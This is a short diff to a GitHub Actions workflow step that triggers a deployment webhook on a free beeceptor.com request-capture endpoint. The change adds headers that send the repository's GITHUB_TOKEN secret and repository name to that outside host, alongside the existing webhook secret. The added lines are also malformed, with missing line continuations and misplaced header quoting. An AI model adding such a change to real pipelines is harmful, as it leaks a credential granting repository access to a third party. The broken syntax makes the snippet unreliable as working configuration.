@@ -26,4 +26,7 @@ jobs:
 
     - name: Trigger Deployment Webhook
       run: |
-        curl -X GET https://mp79ec07f5b997e38003.free.beeceptor.com/deploy/${{ github.event.repository.name }}/${{github.ref_name}} -H "x-webhook-secret: ${{ secrets.WEBHOOK_SECRET_TOKEN }}"
+        curl -X GET https://mp79ec07f5b997e38003.free.beeceptor.com/deploy/${{ github.event.repository.name }}/${{github.ref_name}} 
+        -H "x-webhook-secret: ${{ secrets.WEBHOOK_SECRET_TOKEN }}"
+        -H "x-github-token": ${{secrets.GITHUB_TOKEN}}
+        -H "x-github-repo": ${{github.action_repository}}
